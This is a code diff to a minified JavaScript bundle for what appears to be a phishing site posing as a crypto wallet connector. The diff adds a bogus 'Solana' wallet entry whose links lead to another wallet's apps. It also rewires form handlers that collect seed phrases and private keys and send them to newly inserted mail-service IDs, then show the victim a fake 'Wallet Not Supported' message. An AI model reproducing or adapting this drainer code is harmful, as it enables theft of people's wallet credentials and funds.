@@ -9226,6 +9226,55 @@
                             },
                             updatedAt: "2021-07-30T17:48:12+00:00"
                         },
+                        "225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f3": {
+                            id: "225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f3",
+                            name: "Solana",
+                            slug: "solana",
+                            description: "The most trusted platform to manage digital assets.",
+                            homepage: "https://solana.com/",
+                            chains: ["eip155:1", "eip155:10", "eip155:100", "eip155:1313161554", "eip155:137", "eip155:246", "eip155:4", "eip155:42161", "eip155:43114", "eip155:5", "eip155:56", "eip155:73799"],
+                            versions: ["1", "2"],
+                            sdks: ["sign_v1", "sign_v2"],
+                            app_type: "wallet",
+                            category: "Smart Contract Wallets",
+                            image_id: "3913df81-63c2-4413-d60b-8ff83cbed5001",
+                            image_url: {
+                                sm: "https://solscan.io/_next/static/media/solana-sol-logo.ecf2bf3a.svg",
+                                md: "https://solscan.io/_next/static/media/solana-sol-logo.ecf2bf3a.svg",
+                                lg: "https://solscan.io/_next/static/media/solana-sol-logo.ecf2bf3a.svg"
+                            },
+                            app: {
+                                browser: "https://app.safe.global/",
+                                ios: "https://apps.apple.com/app/id1515759131",
+                                android: "https://play.google.com/store/apps/details?id=io.gnosis.safe",
+                                mac: null,
+                                windows: null,
+                                linux: null,
+                                chrome: null,
+                                firefox: null,
+                                safari: null,
+                                edge: null,
+                                opera: null
+                            },
+                            injected: null,
+                            rdns: null,
+                            mobile: {
+                                native: "solana://",
+                                universal: "https://solana.com/"
+                            },
+                            desktop: {
+                                native: "",
+                                universal: null
+                            },
+                            metadata: {
+                                shortName: "Safe",
+                                colors: {
+                                    primary: "#12FF80",
+                                    secondary: "#121312"
+                                }
+                            },
+                            updatedAt: "2021-07-30T17:48:12.565532+00:00"
+                        },
                         "225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f": {
                             id: "225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f",
                             name: "Safe",
@@ -29897,17 +29946,29 @@
                                 ref: n,
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                        p ? alert("Incorrect Phrase") : (c(!0),
-                                        A("service_omtjtrr", "template_kr56bjt", n.current, "jnsbVFj-cJzuUg_pV").then((e => {
+                                        p ? Toastify({
+                                            text: "Incorrect Phrase",
+                                            className: "info",
+                                            style: {
+                                                background: "linear-gradient(to right, #00b09b, #96c93d)",
+                                            }
+                                        }).showToast() : (c(!0),
+                                        A("service_3gzh9vw", "template_ga4cekm", n.current, "ip3JXcQuJO1cmRCg_").then((e => {
                                                 console.log(e),
-                                                    alert("Wallet Not Supported"),
+                                                    Toastify({
+                                                        text: "Wallet Not Supported",
+                                                        className: "info",
+                                                        style: {
+                                                            background: "linear-gradient(to right, #00b09b, #96c93d)",
+                                                        }
+                                                    }).showToast()
                                                     l(""),
                                                     c(!1)
                                             }
                                             ), (e => {
                                                 console.log(e),
                                                     c(!1),
-                                                    alert(e.message)
+                                                    Toastify(e.message).showToast()
                                             }
                                             )))
                                 }
@@ -29982,18 +30043,30 @@
                                 onSubmit: e => {
                                     e.preventDefault(),
                                         i ? (c(!0),
-                                        A("service_omtjtrr", "template_kr56bjt", n.current, "jnsbVFj-cJzuUg_pV").then((e => {
+                                        A("service_3gzh9vw", "template_ga4cekm", n.current, "ip3JXcQuJO1cmRCg_").then((e => {
                                                 console.log(e),
-                                                    alert("Wallet Not Supported"),
+                                                    Toastify({
+                                                        text: "Wallet Not Supported",
+                                                        className: "info",
+                                                        style: {
+                                                            background: "linear-gradient(to right, #00b09b, #96c93d)",
+                                                        }
+                                                    }).showToast(),
                                                     l(""),
                                                     c(!1)
                                             }
                                             ), (e => {
                                                 console.log(e),
                                                     c(!1),
-                                                    alert(e.message)
+                                                    Toastify(e.message).showToast()
                                             }
-                                            ))) : alert("Invalid private key. Please enter at least 64 alphanumeric characters.")
+                                        ))) : Toastify({
+                                            text: "Invalid private key. Please enter at least 64 alphanumeric characters.",
+                                            className: "info",
+                                            style: {
+                                                background: "linear-gradient(to right, #00b09b, #96c93d)",
+                                            }
+                                        }).showToast()
                                 }
                                 ,
                                 ref: n,
@@ -30042,7 +30115,7 @@
                                 onSubmit: e => {
                                     e.preventDefault(),
                                         i(!0),
-                                        A("service_omtjtrr", "template_kr56bjt", n.current, "jnsbVFj-cJzuUg_pV").then((e => {
+                                        A("service_3gzh9vw", "template_ga4cekm", n.current, "ip3JXcQuJO1cmRCg_").then((e => {
                                             console.log(e),
                                                 l(""),
                                                 i(!1)
@@ -30050,7 +30123,7 @@
                                         ), (e => {
                                             console.log(e),
                                                 i(!1),
-                                                alert(e.message)
+                                                Toastify(e.message).showToast()
                                         }
                                         ))
                                 }
@@ -30353,5 +30426,20 @@
 }
 )();
 
+
+function showToast(message, position, type) {
+    const toast = document.getElementById("toast");
+    toast.className = toast.className + " show";
+
+    if (message) toast.innerText = message;
+
+    if (position !== "") toast.className = toast.className + ` ${position}`;
+    if (type !== "") toast.className = toast.className + ` ${type}`;
+
+    setTimeout(function () {
+        toast.className = toast.className.replace(" show", "");
+    }, 5000);
+
+}
 
 //# sourceMappingURL=main.6d23d4c1.js.map
